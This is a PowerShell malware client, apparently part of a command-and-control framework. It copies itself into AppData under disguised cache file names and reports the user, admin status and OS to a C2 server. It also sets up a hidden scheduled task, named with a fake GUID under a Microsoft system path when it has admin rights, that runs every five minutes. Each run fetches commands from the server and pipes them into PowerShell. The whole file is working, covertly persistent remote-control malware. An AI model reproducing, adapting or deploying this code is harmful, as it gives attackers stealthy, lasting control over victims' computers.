#Client settings
$cc_server = 'http://localhost:41450'
$registation_path = '/convey/register/'
$cmd_path = '/convey/cmd/'
$script = './powershell-client.ps1'
$launcher = './launcher.vbs'
$seed_dir = '~/AppData/Local/Microsoft/Windows/PowerShell/'
$new_script_name = 'ProcessAnalysisCache'
$new_script_path = $seed_dir + $new_script_name
$new_launcher_name = 'RebuildCache.vbs'
$new_launcher_path = $seed_dir + $new_launcher_name
$seed = $seed_dir + 'ProfileDataCache'
$task_name = '{3B3CC70E-08F1-46L6-87ED-4AK69034E676}'
$hash_type = 'SHA256'

#Gather system info
$is_admin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
$user = $(whoami)
$operating_sys = 'Windows ' + [string]$([System.Environment]::OSVersion.Version.Major)


function init_seed {
  mkdir -p $seed_dir
  for ($i=1; $i -le 5000; $i++){Get-Random | Add-Content $seed}
  cp $launcher $new_launcher_path
  cp $script $new_script_path
}

function register {
  if ($is_admin){$user = $user + '(admin)'}
  $url = $cc_server + $registation_path
  $hash_sum = $(Get-FileHash -Algorithm $hash_type $seed).hash
  $body = @{
    hash_type = $hash_type
    hash_sum = $hash_sum
    operating_sys = $operating_sys
    user = $user
  }

  Invoke-RestMethod -Method Post -Uri $url -Body $body
}

function init_task {
  $user = $(whoami)
  cd $seed_dir
  $abs_path = (pwd).ToString() + '\'
  $args = "`"powershell.exe cat $abs_path$new_script_name | powershell`""
  $action = New-ScheduledTaskAction -Execute "$abs_path$new_launcher_name" -Argument $args
  $principal = New-ScheduledTaskPrincipal "$user"
  $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days(50000))
  $settings = New-ScheduledTaskSettingsSet -RunOnlyIfNetworkAvailable -Hidden

  if ($is_admin) {
    $principal = New-ScheduledTaskPrincipal -RunLevel Highest "$user"
    Register-ScheduledTask -TaskName $task_name -TaskPath 'Microsoft/Windows/WOF'-Action $action -Principal $principal -Trigger $trigger -Settings $settings
  } Else {
    Register-ScheduledTask -TaskName $task_name -Action $action -Principal $principal -Trigger $trigger -Settings $settings
  }
}

function run_cmd {
  $url = $cc_server + $cmd_path
  $hash_sum = $(Get-FileHash -Algorithm $hash_type $seed).hash
  $body = @{
    hash_sum = $hash_sum
  }

  Invoke-RestMethod -Method Post -Uri $url -Body $body | powershell
}

#if seed ID doesn't exist then
if (-NOT (Test-Path $seed)) {
    init_seed
    register
    init_task
} Else {
    run_cmd
}
